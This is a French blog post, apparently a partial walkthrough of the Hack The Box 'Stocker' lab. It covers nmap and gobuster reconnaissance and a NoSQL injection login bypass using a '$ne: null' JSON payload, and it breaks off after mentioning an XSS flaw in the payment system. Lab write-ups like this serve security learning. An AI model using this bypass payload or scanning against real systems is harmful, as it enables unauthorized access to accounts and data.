---
id: 16158394977844qs27kgm6
title: Lab HTB Stocker
published_at: 2023-02-20
tags: Linux , Sql injection , XXS
excerpt:
slug:
crosspostedOn: ''
crosspostLink: ''
coverImage: https://firebasestorage.googleapis.com/v0/b/portfolio-d3c7c.appspot.com/o/a11y-banner.png?alt=media&token=283cad1b-a4d7-43ce-b4d3-c60d062ec636
---
# Lab HTB Stocker

![enter image description here](https://miro.medium.com/v2/resize:fit:1380/format:webp/1*5TjSQs6NFzmcs7ZCtXDRxA.png)

## Scan


```
  nmap  10.10.11.196
  nmap -sC -sV -Ao nmap/stocker 10.10.11.196
```
result :
![](https://miro.medium.com/max/1400/1*KaSQYo3Prx9VynznRXmDOw.png)

On peut voir qu'ont a deux port d'ouvert donc go aller les regarder

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*h6dNB2wkBPlYZDFZGDMijQ.png)


## Scan de Subdomaine


```
gobuster vhost -u http://stocker.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*V9o0kVYvPC60OBIfv8-YbA.png)

 Apres de Scan on peut voir que nous avons un domaine dev.stocker.htb go aller check le site

![](https://miro.medium.com/v2/resize:fit:1398/format:webp/1*3iX08-nZQu8sRGX-sTPhyA.png)

## Burp Exploit 

Apres plusieurs heurs de recherche j'ai intercepter la requete avec burp de login

![](https://cdn.discordapp.com/attachments/384017502075879428/1077348291332804608/Q0YKP2AAAAAElFTkSuQmCC.png)

Apres plusieurs minute a chercher j'ai trouver que le code ci-dessus etait vulnerable a la faille NoSql Injection
Voici le lien de l'exploit : [ici](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass)

voici le payload
```js
{"username": {"$ne": null}, "password": {"$ne": null}}
```
![](https://cdn.discordapp.com/attachments/384017502075879428/1077350588565700688/image.png)


on peut voir que le site a etait rediger vers une page stock
![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4OkOdrMhNAY65fOK31QeSw.png)


CTF actuelement en pause mais on a trouver une faille XSS sur le systeme de payement  
